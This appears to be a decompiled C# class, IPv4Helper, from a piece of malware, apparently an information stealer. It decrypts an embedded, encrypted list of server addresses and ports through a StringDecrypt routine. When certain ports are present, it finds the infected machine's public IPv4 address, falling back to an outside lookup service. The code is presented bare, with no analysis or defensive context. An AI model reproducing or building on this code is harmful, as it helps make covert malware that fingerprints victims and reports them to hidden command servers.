using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;

// Token: 0x02000022 RID: 34
public static class IPv4Helper
{
	// Token: 0x060000C0 RID: 192 RVA: 0x000093DC File Offset: 0x000077DC
	private static bool IsLocalIp(IPAddress ip)
	{
		int[] array = ip.ToString().Split(new string[]
		{
			"."
		}, StringSplitOptions.RemoveEmptyEntries).Select(new Func<string, int>(int.Parse)).ToArray<int>();
		return (array[0] == 192 && array[1] == 168) || (array[0] == 172 && array[1] >= 16 && array[1] <= 31) || array[0] == 10;
	}

	// Token: 0x060000C1 RID: 193 RVA: 0x00009458 File Offset: 0x00007858
	public static string GetDefaultIPv4Address()
	{
		try
		{
			bool flag = StringDecrypt.Read(Arguments.IP, Arguments.Key).Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries).Any((string x) => x.Split(new char[]
			{
				':'
			})[1] == "80" || x.Split(new char[]
			{
				':'
			})[1] == "81");
			bool flag2 = flag;
			if (flag2)
			{
				IEnumerable<NetworkInterface> source = from adapter in NetworkInterface.GetAllNetworkInterfaces()
				where adapter.OperationalStatus == OperationalStatus.Up && adapter.Supports(NetworkInterfaceComponent.IPv4) && adapter.GetIPProperties().GatewayAddresses.Count > 0 && adapter.GetIPProperties().GatewayAddresses[0].Address.ToString() != "0.0.0.0"
				select adapter;
				UnicastIPAddressInformationCollection unicastAddresses = source.First<NetworkInterface>().GetIPProperties().UnicastAddresses;
				foreach (UnicastIPAddressInformation unicastIPAddressInformation in unicastAddresses)
				{
					bool flag3 = unicastIPAddressInformation.Address.AddressFamily == AddressFamily.InterNetwork && !IPv4Helper.IsLocalIp(unicastIPAddressInformation.Address) && !IPAddress.IsLoopback(unicastIPAddressInformation.Address);
					if (flag3)
					{
						return unicastIPAddressInformation.Address.ToString();
					}
				}
				return IPv4Helper.Request("https://api.ip.sb/ip", 15000);
			}
		}
		catch (Exception ex)
		{
		}
		return "UNKNOWN";
	}

	// Token: 0x060000C2 RID: 194 RVA: 0x000095C4 File Offset: 0x000079C4
	private static string Request(string uri, int timeout)
	{
		string result;
		try
		{
			WebRequest webRequest = WebRequest.Create(uri);
			webRequest.Timeout = timeout;
			WebResponse response = webRequest.GetResponse();
			using (Stream responseStream = response.GetResponseStream())
			{
				using (StreamReader streamReader = new StreamReader(responseStream))
				{
					result = streamReader.ReadToEnd().Trim();
				}
			}
		}
		catch (Exception ex)
		{
			result = null;
		}
		return result;
	}
}
